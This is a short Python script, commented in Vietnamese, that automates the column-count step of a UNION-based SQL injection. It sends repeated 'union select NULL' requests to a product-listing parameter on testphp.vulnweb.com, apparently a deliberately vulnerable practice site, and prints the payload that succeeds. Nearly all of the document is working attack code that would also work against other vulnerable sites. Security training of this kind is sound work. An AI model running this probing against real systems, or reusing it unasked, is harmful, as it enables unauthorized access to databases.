import requests

payload = "NULL"
domain = f"http://testphp.vulnweb.com/listproducts.php?cat=-1 union select {payload}--"# Tạo payload

respone = requests.get(domain) #Dòng này gửi một yêu cầu HTTP GET đến URL được định nghĩa trong biến domain và lưu kết quả vào biến response.
while "Error: The used SELECT" in respone.text: # Vòng while sẽ chạy cho đến khi số cột của 2 bảng nối bởi union có số cột bằng nhau
    payload = payload + ", NULL" # Sau mỗi lần lặp thêm 1 cột vào payload
    domain = f"http://testphp.vulnweb.com/listproducts.php?cat=-1 union select {payload}--"#cập nhật payload
    respone = requests.get(domain)
   
print(domain) # Xuất payload thành công